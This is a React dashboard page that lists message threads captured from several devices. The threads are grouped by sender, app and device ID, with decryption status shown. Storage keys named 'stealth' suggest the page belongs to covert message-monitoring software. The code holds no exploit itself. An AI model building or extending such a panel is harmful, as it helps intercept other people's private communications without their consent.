"use client";

import React, { useState, useMemo } from "react";
import DashboardLayout from "@/components/layout/DashboardLayout";
import { useFirebaseData } from "@/hooks/useFirebaseData";
import { useKeyVault } from "@/lib/encryption/KeyVaultContext";
import { getAppMeta, getInitials, formatFullDateTime } from "@/lib/utils/formatters";
import { Search, MessagesSquare, ArrowRight, Smartphone, Filter, X } from "lucide-react";
import Link from "next/link";
import { getSecureItem, setSecureItem } from "@/lib/security/secureStorage";

export default function ConversationsPage() {
  const { conversations, devices, loading } = useFirebaseData();
  const { isUnlocked } = useKeyVault();
  const [search, setSearch] = useState("");
  const [selectedApp, setSelectedAppState] = useState(() => getSecureItem("stealth_conv_app", "all"));
  const [selectedDevice, setSelectedDeviceState] = useState(() => getSecureItem("stealth_device_id", "all"));

  const setSelectedApp = (val) => {
    setSelectedAppState(val);
    setSecureItem("stealth_conv_app", val);
  };

  const setSelectedDevice = (val) => {
    setSelectedDeviceState(val);
    setSecureItem("stealth_device_id", val);
  };

  const availableApps = useMemo(() => {
    const set = new Set();
    for (const c of conversations) {
      if (c.appPackage) set.add(c.appPackage);
    }
    return Array.from(set);
  }, [conversations]);

  const filtered = useMemo(() => {
    return conversations.filter((c) => {
      if (selectedDevice !== "all" && c.deviceId !== selectedDevice) return false;
      if (selectedApp !== "all" && c.appPackage !== selectedApp) return false;
      if (!search.trim()) return true;
      const q = search.toLowerCase();
      return (
        (c.senderName && c.senderName.toLowerCase().includes(q)) ||
        (c.deviceId && c.deviceId.toLowerCase().includes(q)) ||
        (c.appPackage && c.appPackage.toLowerCase().includes(q))
      );
    });
  }, [conversations, search, selectedApp, selectedDevice]);

  return (
    <DashboardLayout
      title="Conversations Directory"
      subtitle="Organized conversation threads grouped by sender, device and application context"
    >
      <div className="p-4 sm:p-6 space-y-4">
        {/* Controls Bar */}
        <div className="flex flex-col md:flex-row items-stretch md:items-center justify-between gap-3 p-4 rounded-2xl bg-[#111b21] border border-[#222d34]">
          <div className="flex flex-col sm:flex-row items-center gap-2.5 flex-1">
            {/* Search Input */}
            <div className="relative w-full sm:w-72">
              <Search className="w-4 h-4 absolute left-3 top-2.5 text-[#8696a0]" />
              <input
                type="text"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search contact, text or device..."
                className="w-full pl-9 pr-4 py-2 text-xs bg-[#202c33] border border-[#2a3942] rounded-xl text-slate-100 placeholder-[#8696a0] focus:outline-none focus:border-emerald-500"
              />
            </div>

            {/* Device Selector */}
            <div className="relative w-full sm:w-56">
              <select
                value={selectedDevice}
                onChange={(e) => setSelectedDevice(e.target.value)}
                className="w-full pl-3 pr-7 py-2 text-xs bg-[#202c33] border border-[#2a3942] rounded-xl text-slate-100 focus:outline-none focus:border-emerald-500 cursor-pointer appearance-none"
              >
                <option value="all">🌐 All Devices ({devices.length})</option>
                {devices.map((dev, idx) => (
                  <option key={dev} value={dev}>
                    📱 Device #{idx + 1} ({dev.slice(0, 8)}...)
                  </option>
                ))}
              </select>
              <div className="absolute right-3 top-2.5 pointer-events-none text-[#8696a0] text-[10px]">
                ▼
              </div>
            </div>

            {/* App Selector */}
            {availableApps.length > 1 && (
              <div className="relative w-full sm:w-44">
                <select
                  value={selectedApp}
                  onChange={(e) => setSelectedApp(e.target.value)}
                  className="w-full pl-3 pr-7 py-2 text-xs bg-[#202c33] border border-[#2a3942] rounded-xl text-slate-100 focus:outline-none focus:border-emerald-500 cursor-pointer appearance-none"
                >
                  <option value="all">All Applications</option>
                  {availableApps.map((pkg) => (
                    <option key={pkg} value={pkg}>
                      {getAppMeta(pkg).name}
                    </option>
                  ))}
                </select>
                <div className="absolute right-3 top-2.5 pointer-events-none text-[#8696a0] text-[10px]">
                  ▼
                </div>
              </div>
            )}
          </div>

          <div className="flex items-center gap-3 justify-between md:justify-end">
            {(selectedDevice !== "all" || selectedApp !== "all" || search) && (
              <button
                onClick={() => {
                  setSelectedDevice("all");
                  setSelectedApp("all");
                  setSearch("");
                }}
                className="text-xs text-rose-400 hover:underline flex items-center gap-1"
              >
                <X className="w-3.5 h-3.5" />
                <span>Reset</span>
              </button>
            )}
            <span className="text-xs text-[#8696a0] font-mono whitespace-nowrap">
              Showing {filtered.length} of {conversations.length} threads
            </span>
          </div>
        </div>

        {/* Conversations Table */}
        <div className="overflow-hidden rounded-2xl bg-[#111b21] border border-[#222d34] shadow-sm">
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead className="bg-[#202c33] text-[#8696a0] font-semibold border-b border-[#222d34]">
                <tr>
                  <th className="py-3 px-4">Sender / Contact</th>
                  <th className="py-3 px-4">Application</th>
                  <th className="py-3 px-4">Device ID</th>
                  <th className="py-3 px-4">Messages</th>
                  <th className="py-3 px-4">Last Activity</th>
                  <th className="py-3 px-4 text-right">Action</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#222d34]/60 text-slate-200">
                {filtered.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="py-8 text-center text-[#8696a0]">
                      No conversations match the current criteria.
                    </td>
                  </tr>
                ) : (
                  filtered.map((c) => {
                    const appMeta = getAppMeta(c.appPackage);
                    return (
                      <tr key={c.id} className="hover:bg-[#202c33]/40 transition">
                        <td className="py-3 px-4">
                          <div className="flex items-center gap-2.5">
                            <div
                              className={`w-8 h-8 rounded-full ${appMeta.color} flex items-center justify-center text-white font-bold text-xs`}
                            >
                              {getInitials(c.senderName)}
                            </div>
                            <div>
                              <p className="font-semibold text-slate-100">{c.senderName}</p>
                              <p className="text-[10px] text-[#8696a0] font-mono">
                                {c.isDecrypted ? "Decrypted RAM" : "AES-256 Encrypted"}
                              </p>
                            </div>
                          </div>
                        </td>
                        <td className="py-3 px-4">
                          <span className="text-[11px] px-2 py-0.5 rounded font-mono bg-black/40 text-emerald-400">
                            {appMeta.name}
                          </span>
                        </td>
                        <td className="py-3 px-4 font-mono text-[11px] text-slate-400">
                          {c.deviceId}
                        </td>
                        <td className="py-3 px-4">
                          <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 font-semibold font-mono">
                            {c.messageCount}
                          </span>
                        </td>
                        <td className="py-3 px-4 text-[#8696a0] font-mono text-[11px]">
                          {formatFullDateTime(c.lastTimestamp)}
                        </td>
                        <td className="py-3 px-4 text-right">
                          <Link
                            href="/dashboard/messages"
                            className="inline-flex items-center gap-1 text-xs text-emerald-400 hover:text-emerald-300 font-semibold"
                          >
                            <span>Open Chat</span>
                            <ArrowRight className="w-3.5 h-3.5" />
                          </Link>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </DashboardLayout>
  );
}
